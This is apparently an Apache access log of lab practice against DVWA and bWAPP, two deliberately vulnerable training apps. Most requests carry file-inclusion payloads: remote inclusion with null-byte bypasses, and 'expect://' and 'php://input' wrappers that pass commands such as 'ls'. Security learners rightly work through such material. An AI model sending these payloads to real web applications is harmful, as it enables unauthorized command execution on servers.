192.168.0.32 - - [17/Feb/2022:13:03:52 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/dvwa/images/logo.png\\0 HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:13:03:55 -0500] "GET /dvwa/dvwa/images/logo.png%00 HTTP/1.0" 404 223 "-" "-"
192.168.0.32 - - [17/Feb/2022:13:03:55 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/dvwa/images/logo.png%2500 HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:13:04:00 -0500] "GET /dvwa/dvwa/images/logo.png HTTP/1.0" 200 6749 "-" "-"
192.168.0.32 - - [17/Feb/2022:13:04:00 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.0.101/dvwa/dvwa/images/logo.png HTTP/1.1" 200 8034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:13:04:32 -0500] "GET /dvwa/vulnerabilities/fi/?page=page=expect://ls HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:13:04:56 -0500] "GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:13:05:10 -0500] "GET /dvwa/vulnerabilities/fi/?page=expect://ls HTTP/1.1" 200 1046 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:13:05:50 -0500] "GET /bWAPP/ HTTP/1.1" 302 20 "http://192.168.0.101/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:13:05:50 -0500] "GET /bWAPP/portal.php HTTP/1.1" 200 3584 "http://192.168.0.101/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:13:06:03 -0500] "POST /bWAPP/portal.php HTTP/1.1" 302 20 "http://192.168.0.101/bWAPP/portal.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:13:06:03 -0500] "GET /bWAPP/rlfi.php HTTP/1.1" 200 3115 "http://192.168.0.101/bWAPP/portal.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.32 - - [17/Feb/2022:13:06:08 -0500] "GET /bWAPP/rlfi.php?language=lang_en.php&action=go HTTP/1.1" 200 3146 "http://192.168.0.101/bWAPP/rlfi.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
192.168.0.101 - - [17/Feb/2022:13:06:14 -0500] "GET /bWAPP/portal.php HTTP/1.0" 302 - "-" "-"
192.168.0.101 - - [17/Feb/2022:13:06:14 -0500] "GET /bWAPP//login.php HTTP/1.0" 200 2883 "-" "-"
192.168.0.32 - - [17/Feb/2022:13:06:14 -0500] "GET /bWAPP/rlfi.php?language=http://192.168.0.101/bWAPP/portal.php&action=go HTTP/1.1" 200 3380 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
